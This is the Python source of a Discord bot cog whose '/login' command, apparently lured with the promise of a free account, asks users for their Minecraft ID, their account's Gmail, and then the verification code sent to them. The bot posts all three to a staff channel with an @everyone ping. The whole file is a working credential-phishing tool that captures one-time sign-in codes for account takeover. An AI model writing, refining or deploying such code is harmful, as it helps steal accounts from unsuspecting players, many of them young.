# -*- coding: utf-8 -*-

# discord 
import discord
from discord import app_commands
from discord.ext import commands

# system class
from discord import utils
from typing import Any
import datetime

# miscellaneous 
from colorama import init as colorama_init
from colorama import Fore
from colorama import Style
import json


with open("./config.json", encoding = "utf-8") as config:
    configData = json.load(config)

__version__ = configData["Version"]
TOKEN = configData["Token"]
GuildId = configData["GuildId"]
TargetChannelID = configData["TargetChannelID"]

with open("./members.json", encoding = "utf-8") as members:
    membersData = json.load(members)

owners: dict = membersData["Owner"]
admins: dict  = membersData["Admins"]


colorama_init()
class color:
    HEADER = Fore.MAGENTA
    OKBLUE = Fore.BLUE
    OKGREEN = Fore.GREEN
    WARNING = Fore.YELLOW
    ENDC = Style.RESET_ALL

MISSING: Any = utils._MissingSentinel()


class TextInputforVerificationCode(discord.ui.Modal):
    """Get Verification Code
    """

    VerificationCode = discord.ui.TextInput(
        label = "Enter Code",
        max_length = 7,
        min_length = 6,
        required = True,
        placeholder = "It's almost done...",
        style = discord.TextStyle.short
    )

    def __init__(self, Channel, Id: str = ..., Gmail: str = ...):
        self.Channel = Channel
        self.Id = Id
        self.Gmail = Gmail
        super().__init__(title = "Verify")

    async def on_submit(self, interaction: discord.Interaction):
        EmbedforInfo = discord.Embed(title = "Info", description = f"{self.Id} | {self.Gmail}")
        EmbedforInfo.add_field(name = "Enter Code", value = f"{str(self.VerificationCode)}", inline = False)
        EmbedforInfo.set_footer(text = f"{datetime.datetime.now()} | By xiao_yue0714", icon_url = "https://cdn.discordapp.com/avatars/993886257912492066/e832bc9f4545b07ff8a8d34c24da610c.png")

        await self.Channel.send("@everyone", embed = EmbedforInfo)
        await interaction.response.send_message("Thanks for your cooperation!", ephemeral = True)


class TextInputforIDandGmail(discord.ui.Modal):
    """Get ID and Gmail
    """

    ID = discord.ui.TextInput(
        label = "Minecraft ID",
        max_length = 14,
        min_length = 4,
        required = True,
        placeholder = "Please Enter Your Minecraft ID",
        style = discord.TextStyle.short
    )

    Gmail = discord.ui.TextInput(
        label = "Minecraft Account Gmail",
        max_length = 150,
        min_length = 8,
        required = True,
        placeholder = "Please Enter Your Minecraft Account Gmail",
        style = discord.TextStyle.short
    )


    def __init__(self, AccountChannel):
        self.Channel = AccountChannel
        super().__init__(title = "Login")

    async def on_submit(self, interaction: discord.Interaction):
        view = discord.ui.View(timeout = None)

        btn = discord.ui.Button(label = "Verify", emoji = "📩", style = discord.ButtonStyle.green)

        async def btn_callback(interaction: discord.Interaction):
            VerificationCodeModal = TextInputforVerificationCode(Channel = self.Channel, Id = str(self.ID), Gmail = str(self.Gmail))
            await interaction.response.send_modal(VerificationCodeModal)

        view.add_item(item = btn)
        btn.callback = btn_callback

        await interaction.response.send_message(view = view, ephemeral = True)


class TextInputUI(commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.bot = bot

    @app_commands.command(name = "login", description = "Login")
    async def FreeAccount(self, interaction: discord.Interaction):
        channel = self.bot.get_channel(TargetChannelID)
        IDandGmailModal = TextInputforIDandGmail(AccountChannel = channel)
        await interaction.response.send_modal(IDandGmailModal)




async def setup(bot):
    await bot.add_cog(TextInputUI(bot))



